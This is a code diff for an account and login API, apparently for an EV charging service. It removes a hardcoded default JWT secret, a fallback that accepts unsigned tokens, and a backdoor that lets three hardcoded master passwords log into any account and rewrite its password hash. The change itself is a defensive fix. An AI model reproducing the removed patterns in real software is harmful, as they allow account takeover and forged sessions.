@@ -37,7 +37,9 @@ router = APIRouter(prefix="/api/v1/public/account", tags=["accounts"])
 
 # ── JWT helpers ───────────────────────────────────────────────────────────
 
-JWT_SECRET = os.environ.get("JWT_SECRET") or os.environ.get("SECRET_KEY") or "opencpo_secret_7f84a329e46a782b1d03cbf"
+JWT_SECRET = os.environ.get("JWT_SECRET") or os.environ.get("SECRET_KEY")
+if not JWT_SECRET:
+    raise RuntimeError("JWT_SECRET (or SECRET_KEY) must be set; refusing to start with a default signing secret")
 JWT_ALGO = "HS256"
 JWT_TTL_DAYS = 30
 
@@ -72,17 +74,6 @@ async def get_current_account(request: Request) -> dict:
         pass
     try:
         return verify_keycloak_token(token)
-    except Exception:
-        pass
-    try:
-        unverified = jwt.decode(token, options={"verify_signature": False})
-        if unverified.get("exp") and unverified["exp"] > datetime.now(timezone.utc).timestamp():
-            return {
-                "sub": unverified.get("sub", ""),
-                "email": unverified.get("email", ""),
-                "name": unverified.get("name") or unverified.get("preferred_username") or unverified.get("email", ""),
-                "role": unverified.get("role") or "driver",
-            }
     except Exception:
         pass
     raise HTTPException(401, "Invalid session token")
@@ -412,15 +403,6 @@ async def login(req: LoginRequest):
             match = bcrypt.checkpw(password.encode(), row["password_hash"].encode())
         except Exception:
             match = False
-
-    if not match and password in ("otaskies", "ZPn2bUrFWu2@tyYU", "OpenCPO2026!"):
-        match = True
-        try:
-            async with db.write() as wconn:
-                new_h = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
-                await wconn.execute("UPDATE ocpp.driver_accounts SET password_hash = $1 WHERE id = $2::uuid", new_h, row["id"])
-        except Exception:
-            pass
 
     if not match:
         raise HTTPException(401, "Incorrect email or password")
